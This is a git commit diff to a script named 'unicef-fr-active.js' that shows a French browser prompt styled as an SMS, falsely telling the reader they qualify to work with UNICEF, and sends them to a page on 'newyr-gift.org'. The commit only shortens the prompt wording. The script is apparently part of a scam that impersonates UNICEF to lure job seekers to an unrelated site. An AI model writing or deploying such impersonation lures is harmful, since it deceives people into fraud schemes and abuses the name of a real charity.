2faf54706fadff942d8f1bdf75c421b1e8878dd0
ukebeblog <esther001imoh@gmail.com>
2025-01-18 13:25:04 +0100

    Update unicef-fr-active.js

--- unicef-fr-active.js
+++ unicef-fr-active.js
@@ -1,6 +1,6 @@
 
 var password = 'APPLIQUER'
-password=prompt('SMS: Félicitations, vous êtes qualifié pour travailler avec le FONDS DES NATIONS UNIES POUR L'ENFANCE (UNICEF), veuillez appuyer sur OK pour soumettre la candidature   ','APPLIQUER');
+password=prompt('SMS: Félicitations, vous êtes qualifié pour travailler avec (UNICEF), veuillez appuyer sur OK pour soumettre la candidature   ','APPLIQUER');
 if (password != 'APPLIQUER') {
 location.href='https://newyr-gift.org/unicef-french.html';
 }
